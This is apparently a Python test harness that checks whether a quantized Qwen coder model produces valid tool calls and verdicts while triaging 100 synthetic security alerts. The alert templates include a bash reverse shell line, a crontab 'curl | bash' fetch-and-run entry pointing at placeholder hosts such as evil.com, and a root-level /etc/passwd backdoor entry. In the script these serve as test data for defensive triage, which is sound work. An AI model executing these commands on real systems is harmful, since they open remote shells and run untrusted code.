"""Gate 2: Tool-call viability test for Qwen2.5-Coder-3B-HXQ.

Step 1: Baseline parse rate — raw security alerts, no Mamba pre-filter.
100 trials. Tracks:
  - parse_rate: valid JSON extracted from ```tool_call block
  - tool_valid_rate: tool name is one of the 5 defined tools
  - args_valid_rate: JSON has correct keys for that tool
  - verdict_parse_rate: valid JSON from ```verdict block

Work Order: WO-GATE2-TOOLCALL-01
"""

import json
import re
import time
import platform
import resource
import sys
from pathlib import Path

import torch

# ============================================================================
# Tool schemas (from sentinel/tier2_loop.py)
# ============================================================================

TOOLS = {
    "check_hash": {"required_args": ["path"], "description": "Look up a file hash"},
    "check_process": {"required_args": [], "optional_args": ["filter", "suspicious"], "description": "List or check processes"},
    "check_ports": {"required_args": [], "description": "List listening ports"},
    "scan_file": {"required_args": ["path"], "description": "YARA scan a file"},
    "search_cve": {"required_args": ["query"], "description": "Search CVE database"},
}

SYSTEM_PROMPT = """You are a security triage agent. You analyze alerts from a local
security monitoring system and classify them.

You have these tools available:
- check_hash: Look up a file hash. Args: {"path": "/path/to/file"}
- check_process: List processes or check for suspicious ones. Args: {"filter": "keyword"} or {"suspicious": true}
- check_ports: List listening ports. Args: {}
- scan_file: YARA scan a file. Args: {"path": "/path/to/file"}
- search_cve: Search CVE database. Args: {"query": "CVE-2024-1234"} or {"query": "keyword"}

To use a tool, output:
```tool_call
{"name": "tool_name", "arguments": {"key": "value"}}
```

After analysis, output your final verdict as:
```verdict
{"verdict": "benign|suspicious|escalate", "confidence": 0.0-1.0, "reasoning": "..."}
```

Guidelines:
- benign: Normal system activity, known-good software, expected behavior
- suspicious: Warrants investigation but not urgent. Log and flag for review.
- escalate: Potentially malicious, needs frontier model analysis
Be concise. Focus on facts, not speculation."""

# ============================================================================
# Test cases — 100 synthetic alerts
# ============================================================================

ALERT_TEMPLATES = [
    # SSH brute force variants
    "ALERT: 47 failed SSH login attempts from {ip} to root@localhost in the last 5 minutes. Source: /var/log/auth.log",
    "ALERT: SSH login attempt for non-existent user '{user}' from {ip}. Source: sshd",
    "ALERT: Successful SSH login from unknown IP {ip} after 12 failed attempts. Source: auth.log",
    "ALERT: SSH key-based auth rejected for user '{user}' from {ip}. Key fingerprint not in authorized_keys. Source: sshd",
    "ALERT: Port 22 connection flood — {count} SYN packets from {ip} in 10 seconds. Source: iptables log",

    # File system anomalies
    "ALERT: New binary written to /tmp/{filename} by PID {pid} (user: www-data). Source: inotify",
    "ALERT: /etc/passwd modified. New entry added: '{user}:x:0:0::/root:/bin/bash'. Source: auditd",
    "ALERT: Executable permission set on /var/www/html/{filename}. Source: inotify",
    "ALERT: File /usr/bin/{filename} replaced. SHA256 mismatch with package manager record. Source: debsums",
    "ALERT: Large file write to /tmp/{filename} ({size}MB). Process: curl (PID {pid}). Source: inotify",

    # Process anomalies
    "ALERT: Process '{procname}' (PID {pid}) spawned by apache2, running as root. Source: auditd",
    "ALERT: Reverse shell pattern detected: bash -i >& /dev/tcp/{ip}/{port} 0>&1. PID {pid}. Source: process monitor",
    "ALERT: Process '{procname}' making outbound connections to {ip}:{port} every 30s. Source: netstat monitor",
    "ALERT: crontab modified for user '{user}'. New entry: '*/5 * * * * curl {url} | bash'. Source: auditd",
    "ALERT: Process '{procname}' (PID {pid}) consuming 95% CPU for 10+ minutes. Source: resource monitor",

    # Network anomalies
    "ALERT: Outbound connection to known C2 IP {ip} on port {port}. Process: {procname} (PID {pid}). Source: threat intel feed",
    "ALERT: DNS query for suspicious domain '{domain}'. Response: {ip}. Source: DNS monitor",
    "ALERT: New listening port {port}/tcp opened by process '{procname}' (PID {pid}). Source: netstat monitor",
    "ALERT: ARP spoofing detected — MAC {mac} claiming IP {ip}. Source: arpwatch",
    "ALERT: HTTP POST to {url} with base64-encoded body ({size}KB). Process: python3 (PID {pid}). Source: traffic inspector",
]

def _gen_alerts(n=100):
    """Generate n diverse alerts from templates."""
    import random
    random.seed(42)

    ips = ["192.168.1.105", "10.0.0.44", "45.33.32.156", "103.224.182.250",
           "172.16.0.99", "8.8.4.4", "91.189.88.142", "185.220.101.34",
           "23.94.5.133", "198.51.100.7"]
    users = ["admin", "deploy", "postgres", "git", "nobody", "mysql",
             "testuser", "backup", "docker", "jenkins"]
    filenames = ["update.sh", "config.bin", "libcrypto.so", "payload.elf",
                 "debug.log", "shell.php", "agent.py", "tmp_cache", "svc.exe", "data.tar.gz"]
    procnames = ["nc", "nmap", "python3", "curl", "wget", "bash", "cryptominer",
                 "bind_shell", "sshd_backdoor", "keylogger"]
    domains = ["evil.example.com", "update.malware.ru", "c2.darkweb.io",
               "data-exfil.xyz", "crypto-pool.cc"]
    urls = ["http://evil.com/payload", "http://45.33.32.156:8080/cmd",
            "https://paste.ee/r/abcdef", "http://10.0.0.1/callback"]
    macs = ["00:11:22:33:44:55", "de:ad:be:ef:ca:fe", "aa:bb:cc:dd:ee:ff"]

    alerts = []
    for i in range(n):
        tmpl = ALERT_TEMPLATES[i % len(ALERT_TEMPLATES)]
        alert = tmpl.format(
            ip=random.choice(ips),
            user=random.choice(users),
            filename=random.choice(filenames),
            procname=random.choice(procnames),
            pid=random.randint(1000, 65535),
            port=random.choice([4444, 8080, 9999, 1337, 31337, 443, 80]),
            count=random.randint(50, 500),
            size=random.randint(1, 500),
            domain=random.choice(domains),
            url=random.choice(urls),
            mac=random.choice(macs),
        )
        alerts.append(alert)
    return alerts


# ============================================================================
# Parsing
# ============================================================================

def _extract_tool_call(text: str) -> dict | None:
    """Extract first ```tool_call JSON block."""
    m = re.search(r'```tool_call\s*\n(.*?)\n```', text, re.DOTALL)
    if not m:
        # Fallback: try ```json with "name" key
        m = re.search(r'```(?:json)?\s*\n(\{[^`]*?"name"[^`]*?\})\s*\n```', text, re.DOTALL)
    if not m:
        return None
    try:
        return json.loads(m.group(1).strip())
    except json.JSONDecodeError:
        return None


def _extract_verdict(text: str) -> dict | None:
    """Extract ```verdict JSON block."""
    m = re.search(r'```verdict\s*\n(.*?)\n```', text, re.DOTALL)
    if not m:
        return None
    try:
        return json.loads(m.group(1).strip())
    except json.JSONDecodeError:
        return None


def _validate_tool_call(tc: dict) -> tuple[bool, bool]:
    """Returns (tool_name_valid, args_valid)."""
    name = tc.get("name", "")
    tool_valid = name in TOOLS

    args = tc.get("arguments", {})
    if not isinstance(args, dict):
        return tool_valid, False

    if not tool_valid:
        return False, False

    # Check required args
    required = TOOLS[name]["required_args"]
    args_ok = all(k in args for k in required)
    return True, args_ok


def _validate_verdict(v: dict) -> bool:
    """Check verdict has required fields."""
    return (
        isinstance(v.get("verdict"), str) and
        v["verdict"] in ("benign", "suspicious", "escalate") and
        isinstance(v.get("confidence"), (int, float)) and
        isinstance(v.get("reasoning"), str)
    )


# ============================================================================
# Main
# ============================================================================

def main():
    t_start = time.time()
    cpu_start = time.process_time()
    start_iso = time.strftime('%Y-%m-%dT%H:%M:%S')

    n_trials = int(sys.argv[1]) if len(sys.argv) > 1 else 100
    print(f"Gate 2 Step 1: Qwen-3B-HXQ tool-call baseline ({n_trials} trials)")
    print("=" * 70)

    # Load model
    print("[1] Loading model...")
    import helix_substrate.hf_quantizer
    from transformers import AutoModelForCausalLM, AutoTokenizer

    model_path = "/home/voidstr3m33/models/qwen2.5-coder-3b-helix/"
    tokenizer = AutoTokenizer.from_pretrained(model_path)
    model = AutoModelForCausalLM.from_pretrained(
        model_path, device_map="cuda", dtype=torch.bfloat16,
    )
    model.eval()
    print(f"  Loaded. VRAM: {torch.cuda.memory_allocated() / 1e6:.0f} MB")

    # Generate alerts
    alerts = _gen_alerts(n_trials)

    # Run trials
    print(f"\n[2] Running {n_trials} trials...")
    results = []
    for i, alert_text in enumerate(alerts):
        messages = [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": alert_text},
        ]

        prompt = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
        inputs = tokenizer(prompt, return_tensors="pt", truncation=True, max_length=1024).to("cuda")

        with torch.no_grad():
            out = model.generate(
                **inputs,
                max_new_tokens=300,
                do_sample=False,
                temperature=None,
                top_p=None,
            )

        response = tokenizer.decode(out[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)

        # Parse
        tc = _extract_tool_call(response)
        verdict = _extract_verdict(response)

        tc_parsed = tc is not None
        tool_valid = False
        args_valid = False
        if tc_parsed:
            tool_valid, args_valid = _validate_tool_call(tc)

        verdict_parsed = verdict is not None
        verdict_valid = _validate_verdict(verdict) if verdict_parsed else False

        result = {
            "trial": i,
            "alert": alert_text[:100],
            "tool_call_parsed": tc_parsed,
            "tool_name_valid": tool_valid,
            "args_valid": args_valid,
            "verdict_parsed": verdict_parsed,
            "verdict_valid": verdict_valid,
            "tool_call": tc,
            "verdict": verdict,
            "response_len": len(response),
        }
        results.append(result)

        # Progress
        if (i + 1) % 10 == 0:
            parse_so_far = sum(1 for r in results if r["tool_call_parsed"]) / len(results)
            print(f"  [{i+1}/{n_trials}] parse_rate={parse_so_far:.0%}")

    # Compute metrics
    n = len(results)
    tc_parsed = sum(1 for r in results if r["tool_call_parsed"])
    tool_valid = sum(1 for r in results if r["tool_name_valid"])
    args_valid = sum(1 for r in results if r["args_valid"])
    verdict_parsed = sum(1 for r in results if r["verdict_parsed"])
    verdict_valid = sum(1 for r in results if r["verdict_valid"])

    metrics = {
        "tool_call_parse_rate": round(tc_parsed / n, 4),
        "tool_name_valid_rate": round(tool_valid / n, 4),
        "args_valid_rate": round(args_valid / n, 4),
        "verdict_parse_rate": round(verdict_parsed / n, 4),
        "verdict_valid_rate": round(verdict_valid / n, 4),
    }

    # Tool distribution
    tool_counts = {}
    for r in results:
        if r["tool_call"] and r["tool_name_valid"]:
            name = r["tool_call"]["name"]
            tool_counts[name] = tool_counts.get(name, 0) + 1

    print(f"\n{'=' * 70}")
    print(f"RESULTS — Gate 2 Step 1 (Qwen-3B-HXQ, {n_trials} trials)")
    print(f"{'=' * 70}")
    print(f"  Tool call parse rate:   {tc_parsed}/{n} = {metrics['tool_call_parse_rate']:.0%}")
    print(f"  Tool name valid rate:   {tool_valid}/{n} = {metrics['tool_name_valid_rate']:.0%}")
    print(f"  Args valid rate:        {args_valid}/{n} = {metrics['args_valid_rate']:.0%}")
    print(f"  Verdict parse rate:     {verdict_parsed}/{n} = {metrics['verdict_parse_rate']:.0%}")
    print(f"  Verdict valid rate:     {verdict_valid}/{n} = {metrics['verdict_valid_rate']:.0%}")
    print(f"\n  Tool distribution: {json.dumps(tool_counts, indent=4)}")

    # Decision
    overall = metrics["tool_call_parse_rate"]
    if overall >= 0.70:
        decision = "PASS — viable for Sentinel Tier 2"
    elif overall >= 0.50:
        decision = "MARGINAL — needs constrained decoding or LoRA fine-tune"
    else:
        decision = "FAIL — model cannot reliably tool-call; consider 7B or restructure Tier 2"
    print(f"\n  DECISION: {decision}")

    # Save receipt
    receipt_dir = Path("/home/voidstr3m33/helix-substrate/receipts/gate2_toolcall")
    receipt_dir.mkdir(parents=True, exist_ok=True)

    receipt = {
        "work_order": "WO-GATE2-TOOLCALL-01",
        "gate": "Gate 2 Step 1: Tool-call viability baseline",
        "model": "EchoLabs33/qwen2.5-coder-3b-helix (HXQ)",
        "n_trials": n_trials,
        "metrics": metrics,
        "tool_distribution": tool_counts,
        "decision": decision,
        "failed_trials": [
            {"trial": r["trial"], "alert": r["alert"], "response_len": r["response_len"]}
            for r in results if not r["tool_call_parsed"]
        ],
        "cost": {
            "wall_time_s": round(time.time() - t_start, 3),
            "cpu_time_s": round(time.process_time() - cpu_start, 3),
            "peak_memory_mb": round(resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024, 1),
            "python_version": platform.python_version(),
            "hostname": platform.node(),
            "timestamp_start": start_iso,
            "timestamp_end": time.strftime('%Y-%m-%dT%H:%M:%S'),
            "gpu": "Quadro T2000 4GB",
            "vram_model_mb": round(torch.cuda.memory_allocated() / 1e6, 1),
        },
    }

    receipt_path = receipt_dir / f"baseline_{n_trials}trials.json"
    with open(receipt_path, "w") as f:
        json.dump(receipt, f, indent=2)
    print(f"\n  Receipt: {receipt_path}")

    # Also save per-trial details
    details_path = receipt_dir / f"baseline_{n_trials}trials_details.jsonl"
    with open(details_path, "w") as f:
        for r in results:
            f.write(json.dumps(r) + "\n")
    print(f"  Details: {details_path}")


if __name__ == "__main__":
    main()
